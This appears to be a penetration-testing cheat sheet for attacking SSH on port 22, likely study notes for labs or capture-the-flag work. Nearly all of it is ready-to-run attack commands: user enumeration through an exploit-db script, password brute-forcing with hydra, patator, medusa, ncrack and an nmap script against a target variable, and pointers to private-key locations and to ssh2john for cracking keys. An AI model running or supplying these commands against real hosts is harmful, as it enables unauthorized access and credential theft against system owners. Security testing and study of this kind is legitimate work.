# SSH -TCP 22

## User Enumeration

```
python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
```

## Banner Grabbing

```
nmap -sV -p T:22 $ip
```

## Vulnerable version

```
7.2p1
```

## Connection

#### Connect to SSH

```
ssh <user name>@$ip
```

**Connect to SSH with private key**

```
chmod 400 <id_rsa_key>
ssh –i key <user name>@$ip
```

## BruteForce

#### Patator

```
patator ssh_login host=$ip user=FILE0 0=user.txt password=FILE1 1=pass.txt
```

**Hydra**

Known Username

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<target ip address>
```

```
hydra -v -V -l root -P pass.txt $ip ssh
```

Username and Password attack

```
hydra -L user.txt -P pass.txt ssh://<target ip address>
```

```
hydra -L user.txt -P pass.txt $ip ssh
```

**Medusa**

```
medusa -h $ip -U user.txt -P pass.txt -M ssh
```

**Ncrack**

```
ncrack –v –U user.txt –P pass.txt $ip:22
```

**Nmap**

```
nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s $ip
```

## Path of id\_rsa

```
$user/.ssh/id_rsa
$user/.ssh/authorized key
```

## Crack id\_rsa

```
/usr/share/john/ssh2john.py
```

## Configuration files

```
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
.shostsssh_config
sshd_config
authorized_keys
ssh_known_hosts
.shosts
```

## Exploitation

* Gather version numbers
* Searchsploit
* Default Creds
* Creds previously gathered
* Download the software
